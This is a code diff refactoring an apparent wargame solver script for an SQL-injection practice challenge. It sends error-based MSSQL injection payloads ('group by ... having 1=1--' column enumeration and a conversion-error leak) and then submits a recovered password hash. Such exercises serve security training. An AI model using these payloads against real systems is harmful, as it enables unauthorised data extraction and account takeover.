@@ -1,15 +1,5 @@
 #!/usr/bin/env python3
 import los
-from bs4 import BeautifulSoup
-import re
-
-
-def resp(url: str, param: dict, cook: dict, text="select"):
-    response = los.get_request(url, param, cook)
-
-    soup = BeautifulSoup(response, 'html.parser')
-    war = soup.find_all(string=re.compile(text))
-    print(war)
 
 
 def main():
@@ -33,31 +23,27 @@ def main():
 
     param = dict(
         pw="' group by pw having 1=1--")
-    resp(url, param, cook)
+    los.resp_with_message(url, param, cook)
 
     param = dict(
         pw="' group by pw,id having 1=1--")
-    resp(url, param, cook)
+    los.resp_with_message(url, param, cook)
 
     param = dict(
         pw="' group by pw,id,[45a88487] having 1=1--")
-    resp(url, param, cook)
+    los.resp_with_message(url, param, cook)
 
     param = dict(
         pw="' group by pw,id,[45a88487],[13477a35] having 1=1--")
-    resp(url, param, cook)
+    los.resp_with_message(url, param, cook)
 
     param = dict(
         pw="' group by pw,id,[45a88487],[13477a35],[9604b0c8] having 1=1--")
-    response = los.get_request(url, param, cook)
-
-    soup = BeautifulSoup(response, 'html.parser')
-    war = soup.find_all(string=re.compile("select"))
-    print(war)
+    los.resp_with_message(url, param, cook)
 
     param = dict(
         id="admin' and \"9604b0c8\"=1 --")
-    resp(url, param, cook, text="Conversion failed")
+    los.resp_with_message(url, param, cook, text="Conversion failed")
 
     param = dict(pw='aa68a4b3fb327dee07f868450f7e1183')
     response = los.get_request(url, param, cook)
